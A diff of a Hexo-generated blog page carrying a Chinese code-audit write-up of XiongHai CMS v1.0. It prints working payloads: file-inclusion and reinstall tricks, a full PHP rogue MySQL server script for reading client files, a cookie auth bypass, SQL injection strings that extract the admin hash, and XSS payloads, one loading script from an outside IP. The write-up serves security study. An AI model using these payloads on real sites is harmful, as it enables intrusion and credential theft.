@@ -83,7 +83,9 @@
     
 	<!-- mathjax -->
 	
-<meta name="generator" content="Hexo 5.4.2"></head>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -189,7 +191,6 @@
 <h4 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h4><p><a target="_blank" rel="noopener" href="https://down.chinaz.com/search/%E7%86%8A%E6%B5%B7CMS.htm">https://down.chinaz.com/search/%E7%86%8A%E6%B5%B7CMS.htm</a> 站长之家下载源码。</p>
 <p>这里选用phpstudy搭建CMS运行环境</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php: 5.2.17</span><br><span class="line">apache:</span><br><span class="line">mysql: 5.5.53</span><br><span class="line">windows: Windows 11 家庭中文版</span><br></pre></td></tr></table></figure>
-
 <h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>先拿自动化工具扫一下</p>
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221129232556955.png" alt="image-20221129232556955"></p>
 <p>好家伙331个，这误报率有点高</p>
@@ -198,7 +199,6 @@
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221129233208496.png" alt="image-20221129233208496"></p>
 <p>例如我们在根目录写一个shell.php，其中包含<code>phpinfo()</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r=../shell</span><br></pre></td></tr></table></figure>
-
 <p>当然这里后缀有限制，我们特殊条件下也可以采用00截断，但现在不常见了就不展开了</p>
 <blockquote>
 <p> php 版本小于 5.3.4 而且GPC = Off 允许使用%00 </p>
@@ -207,27 +207,23 @@
 <h5 id="INSTALL安装逻辑问题"><a href="#INSTALL安装逻辑问题" class="headerlink" title="INSTALL安装逻辑问题"></a>INSTALL安装逻辑问题</h5><p>在<code>/install/index.php</code>中，判断网站是否已安装取决于当前目录是否存在<code>InstallLock.txt</code>文件，所以如果我们是利用前面所述的文件包含漏洞，在根目录包含<code>install/index.php</code>文件就会导致重装问题</p>
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201110203977.png" alt="image-20221201110203977"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r=../install/index</span><br></pre></td></tr></table></figure>
-
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201110456956.png" alt="image-20221201110456956"></p>
 <p>这里Y4是否提到了一个配合目录穿越读文件的利用</p>
 <p>首先如果是在根目录去包含install文件的话是会出错的，因为其中会包含一个<code>../inc/db.class.php</code>文件。该文件如果在根目录包含是一定出错的。因此，我们需要找到一个<strong>保持相对路径相同</strong>包含点文件来利用</p>
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201112649470.png" alt="image-20221201112649470"></p>
 <p><code>/admin/index.php</code>便是比较好利用的，这里看到当前文件与<code>/install/index.php</code>针对<code>/inc/conn.php</code>的相对路径是一样的，因此可以包含到正确文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r=../../install/index</span><br></pre></td></tr></table></figure>
-
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201112831377.png" alt="image-20221201112831377"></p>
 <p>进一步我们这里便可以利用恶意mysql服务端来读取任意文件</p>
 <p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2021/04/23/MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">https://www.mi1k7ea.com/2021/04/23/MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</a></p>
 <p><strong>exp:</strong> 注意版本适配</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unhex</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123; <span class="keyword">return</span> <span class="title function_ invoke__">pack</span>(<span class="string">&quot;H*&quot;</span>, <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;#[^a-f0-9]+#si&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>)); &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$srv</span> = <span class="title function_ invoke__">stream_socket_server</span>(<span class="string">&quot;tcp://0.0.0.0:1237&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Enter filename to get [<span class="subst">$filename</span>] &gt; &quot;</span>;</span><br><span class="line">  <span class="variable">$newFilename</span> = <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">fgets</span>(STDIN), <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$newFilename</span>)) &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$newFilename</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;[.] Waiting for connection on 0.0.0.0:1237\n&quot;</span>;</span><br><span class="line">  <span class="variable">$s</span> = <span class="title function_ invoke__">stream_socket_accept</span>(<span class="variable">$srv</span>, -<span class="number">1</span>, <span class="variable">$peer</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;[+] Connection from <span class="subst">$peer</span> - greet... &quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">fwrite</span>(<span class="variable">$s</span>, <span class="title function_ invoke__">unhex</span>(<span class="string">&#x27;45 00 00 00 0a 35 2e 31  2e 36 33 2d 30 75 62 75</span></span><br><span class="line"><span class="string">                    6e 74 75 30 2e 31 30 2e  30 34 2e 31 00 26 00 00</span></span><br><span class="line"><span class="string">                    00 7a 42 7a 60 51 56 3b  64 00 ff f7 08 02 00 00</span></span><br><span class="line"><span class="string">                    00 00 00 00 00 00 00 00  00 00 00 00 64 4c 2f 44</span></span><br><span class="line"><span class="string">                    47 77 43 2a 43 56 63 72  00                     &#x27;</span>));</span><br><span class="line">  <span class="title function_ invoke__">fread</span>(<span class="variable">$s</span>, <span class="number">8192</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;auth ok... &quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">fwrite</span>(<span class="variable">$s</span>, <span class="title function_ invoke__">unhex</span>(<span class="string">&#x27;07 00 00 02 00 00 00 02  00 00 00&#x27;</span>));</span><br><span class="line">  <span class="title function_ invoke__">fread</span>(<span class="variable">$s</span>, <span class="number">8192</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;some shit ok... &quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">fwrite</span>(<span class="variable">$s</span>, <span class="title function_ invoke__">unhex</span>(<span class="string">&#x27;07 00 00 01 00 00 00 00  00 00 00&#x27;</span>));</span><br><span class="line">  <span class="title function_ invoke__">fread</span>(<span class="variable">$s</span>, <span class="number">8192</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;want file... &quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">fwrite</span>(<span class="variable">$s</span>, <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) + <span class="number">1</span>) . <span class="string">&quot;\x00\x00\x01\xFB&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">  <span class="title function_ invoke__">stream_socket_shutdown</span>(<span class="variable">$s</span>, STREAM_SHUT_WR);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;[+] <span class="subst">$filename</span> from <span class="subst">$peer</span>:\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$len</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$s</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$len</span>)) &#123;</span><br><span class="line">    <span class="keyword">list</span> (, <span class="variable">$len</span>) = <span class="title function_ invoke__">unpack</span>(<span class="string">&quot;V&quot;</span>, <span class="variable">$len</span>);</span><br><span class="line">    <span class="variable">$len</span> &amp;= <span class="number">0xffffff</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$len</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="variable">$chunk</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$s</span>, <span class="variable">$len</span>);</span><br><span class="line">      <span class="variable">$len</span> -= <span class="title function_ invoke__">strlen</span>(<span class="variable">$chunk</span>);</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$chunk</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201114341966.png" alt="image-20221201114341966"></p>
 <h5 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h5><p>inc目录下一般是配置文件，我们在checklogin.php中发现越权</p>
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221129234657636.png" alt="image-20221129234657636"></p>
 <p>很简单的一个越权，这里只检验了cookie的user字段是否为空</p>
 <p>我们利用admin后台的其中一个页面<code>wzlist.php</code>做尝试</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/admin/?r=wzlist</span><br><span class="line">Cookie: user=whatever</span><br></pre></td></tr></table></figure>
-
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221129235210714.png" alt="image-20221129235210714"></p>
 <h5 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h5><p>/admin/files/login.php下，可以看到user参数被直接拼接，并且单引号闭合，还有报错提供</p>
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221129235904078.png" alt="image-20221129235904078"></p>
@@ -235,7 +231,6 @@
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130223944666.png" alt="image-20221130223944666"></p>
 <p>综上，这里的一种利用方式就是通过报错注入得到admin账户的密码，然后登录后台</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/admin/?r=login</span><br><span class="line">user=-1&#x27; and updatexml(1,concat(0x23,database(),0x23),1) #        //xhcms_v1.0</span><br><span class="line">user=-1&#x27; and updatexml(1,concat(0x23,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),32,32),0x23),1) #   //manage</span><br><span class="line">user=-1&#x27; and updatexml(1,concat(0x23,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;manage&#x27;),1,32),0x23),1) </span><br><span class="line">// id,user,name,password,img,mail,qq,date 8个字段</span><br><span class="line">user=-1&#x27; and updatexml(1,concat(0x23,substr((select group_concat(user,password) from manage),1,32),0x23),1) # </span><br><span class="line">// admin 21232f297a57a5a743894a0e4a801fc3</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130224839280.png" alt="image-20221130224839280"></p>
 <p>拿到md5后去cmd5上解个密</p>
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130230504913.png" alt="image-20221130230504913"></p>
@@ -243,7 +238,6 @@
 <p>第二种方法就是sqlmap一把梭，原理是一样的（我这里没注出来）</p>
 <p>第三种方法是Y4师傅说的利用联合查询造出假数据，只要满足回显1行，并且md5的原值可知即可，还有注意字段数保持一致，满足8个字段（第4个字段为密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user=1&#x27; union select 1,2,&#x27;RacerZ&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;,5,6,7,8 #</span><br><span class="line">password=1</span><br></pre></td></tr></table></figure>
-
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130232228795.png" alt="image-20221130232228795"></p>
 <h5 id="后台SQL"><a href="#后台SQL" class="headerlink" title="后台SQL"></a>后台SQL</h5><p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130232615896.png" alt="image-20221130232615896"></p>
 <p>关键词 <code>mysql_query</code></p>
@@ -265,26 +259,22 @@
 <p><strong>/files/content.php</strong></p>
 <p>这里便是存在我们刚才说的addsalshes虽然加了，但是可以看到query那块的sql查询并没有使用引号包裹，那么我们直接查就可以了</p>
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201085501422.png" alt="image-20221201085501422"></p>
-<p>同理在**/files/software.php**下也是这种情况</p>
+<p>同理在<strong>/files/software.php</strong>下也是这种情况</p>
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201085817340.png" alt="image-20221201085817340"></p>
 <p>基本上存在表单的页面都有SQL注入hhhhhh。</p>
-<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>在**/files/contact.php页面中**</p>
+<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>在<strong>/files/contact.php页面中</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$page</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$page</span>&lt;&gt;<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$page</span>&lt;&gt;<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$pages</span>=<span class="string">&quot;第&quot;</span>.<span class="variable">$page</span>.<span class="string">&quot;页 - &quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>这里会接收page参数，并回显</p>
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201094836660.png" alt="image-20221201094836660"></p>
 <p>一个典型的反射型XSS</p>
 <p>最基本的payload，注意闭合a标签</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page=&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a&gt;</span><br></pre></td></tr></table></figure>
-
 <p>如果我们想回显更复杂的字符串，就需要绕开引号导致addslashes的限制</p>
 <p>当然有个标签 SRC属性是可以不带引号的，尝试引入第三方js或第三方html页面</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT SRC=http://43.140.198.45:81&gt;&lt;/SCRIPT&gt;</span><br><span class="line">page=&lt;/a&gt;&lt;SCRIPT SRC=http://43.140.198.45:81/xss.js&gt;&lt;/SCRIPT&gt;&lt;a&gt;</span><br></pre></td></tr></table></figure>
-
 <p>或者</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page=&lt;/a&gt;&lt;script&gt;alert(/hacked by RacerZ/)&lt;/script&gt;&lt;a&gt;</span><br></pre></td></tr></table></figure>
-
-<p>在**/files/content.php**中</p>
+<p>在<strong>/files/content.php</strong>中</p>
 <p>id可控，cookie也可控</p>
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201102040479.png" alt="image-20221201102040479"></p>
 <p>同时在前面，回显参数来自pinglun变量，该变量的值来自SQL查询interaction表，表名这里是否可利用存储型XSS，我们看下可提交存入数据库的参数是否存在过滤</p>
@@ -293,7 +283,7 @@
 <p>这里可以看到能提交name，email，url，content等参数，并且提交至<code>/?r=submit&amp;type=comment&amp;cid=&lt;?php echo $id?&gt;</code>，看下该页面对content变量的值做了防护，其他参数都没啥过滤</p>
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201104301792.png" alt="image-20221201104301792"></p>
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201104227896.png" alt="image-20221201104227896"></p>
-<p>再看看最终回显的参数有哪些，url和name参数是可回显的，url回显位置不太好在a标签的href处而且必须得包含http://，可以尝试在name处注入payload</p>
+<p>再看看最终回显的参数有哪些，url和name参数是可回显的，url回显位置不太好在a标签的href处而且必须得包含<a target="_blank" rel="noopener" href="http://，可以尝试在name处注入payload">http://，可以尝试在name处注入payload</a></p>
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201104546482.png" alt="image-20221201104546482"></p>
 <p><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201104959496.png" alt="image-20221201104959496"></p>
 <h5 id="验证码逻辑问题"><a href="#验证码逻辑问题" class="headerlink" title="验证码逻辑问题"></a>验证码逻辑问题</h5><p>我们在刚才的<code>/files/content.php</code>当中看到还引入了一个验证码</p>
